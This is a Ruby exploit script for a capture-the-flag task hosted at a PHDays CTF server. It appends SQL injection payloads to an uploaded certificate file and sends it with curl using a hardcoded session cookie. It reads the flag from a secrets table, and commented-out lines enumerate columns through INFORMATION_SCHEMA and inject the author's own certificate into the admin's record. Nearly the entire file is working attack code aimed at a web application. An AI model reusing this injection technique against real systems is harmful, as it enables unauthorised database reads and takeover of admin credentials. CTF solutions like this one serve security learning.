#!/usr/bin/env ruby

def upload
  # XXX: get session id from your browser cookies!
  # (or tcpdump :)
  session="dZnITNS/joMp0wM77YcdgGkTNLc=?user_id=TDcxOUwKLg=="
  `curl -s -F "key=@ca.tmp;type=application/x-x509-ca-cert" http://ctf.phdays.com:3185/ -b "session=#{session}"`.strip
end

# self generated certificate, required for task
PEM = File.read("ca.crt")

def attack payload
  File.open("ca.tmp","wb") do |f|
    f << PEM
    f << payload
  end
  r = upload
  puts r
end

## to insert my own certificate into admin's:
#pem = PEM.gsub("\n","\\n")
#attack "'),(1,'#{pem}'); /* '"

#attack "'),(719,(SELECT group_concat(column_name) FROM INFORMATION_SCHEMA.columns where table_name='secrets')); /* '"

attack "'),(719,(SELECT flag from secrets)); /* '"
